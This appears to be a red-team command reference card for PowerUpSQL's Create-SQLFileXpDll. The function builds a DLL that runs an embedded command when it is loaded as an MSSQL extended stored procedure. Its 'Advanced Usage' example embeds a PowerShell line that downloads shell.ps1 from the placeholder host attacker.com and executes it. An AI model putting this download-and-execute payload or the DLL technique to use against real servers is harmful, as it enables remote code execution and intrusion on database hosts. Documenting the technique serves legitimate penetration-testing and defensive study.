---
id: ff250d36-8ab9-4701-81b4-b9aba2fc06db
name: create-mssql-extended-stored-procedure-dll
type: command
executor: powershell
data: >-
  Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test >
  c:\temp\test.txt" -ExportName xp_test
output: null
created_at: '2023-04-06T03:56:20.295363+00:00'
updated_at: '2023-04-10T20:36:30.722000+00:00'
platforms:
  - Windows
tags:
  - mssql
  - dll-injection
verified: true
validated: true
---

# create-mssql-extended-stored-procedure-dll

## Command

```powershell
Create-SQLFileXpDll -OutFile $_OUTFILE -Command "$_PAYLOAD_COMMAND" -ExportName $_EXPORT_NAME
```

## Description

This command uses the PowerUpSQL module to generate a DLL file suitable for injection as an MSSQL extended stored procedure. It embeds a payload command that executes when the procedure is called.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -OutFile ($__OUTFILE) | Path to save the generated DLL file | Yes |
| -Command ($__PAYLOAD_COMMAND) | The command or payload to embed in the DLL (e.g., file creation or shell execution) | Yes |
| -ExportName ($__EXPORT_NAME) | Name of the exported function for the extended procedure (e.g., xp_test) | Yes |

## Examples

### Basic Usage

```powershell
Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test
```

### Advanced Usage

```powershell
Create-SQLFileXpDll -OutFile C:\temp\malicious.dll -Command "powershell -c 'Invoke-WebRequest -Uri http://attacker.com/shell.ps1 -OutFile C:\temp\shell.ps1; . C:\temp\shell.ps1'" -ExportName xp_shell
```

## Expected Output

No stdout output; the command silently creates the DLL file at the specified path. Verify success by checking if the file exists and is a valid PE executable (e.g., via file command or loading in a hex editor).

## Related

- [[procedures/mssql-server-extended-stored-procedure-dll-injection]]
- [[commands/load-dll-as-extended-procedure]]
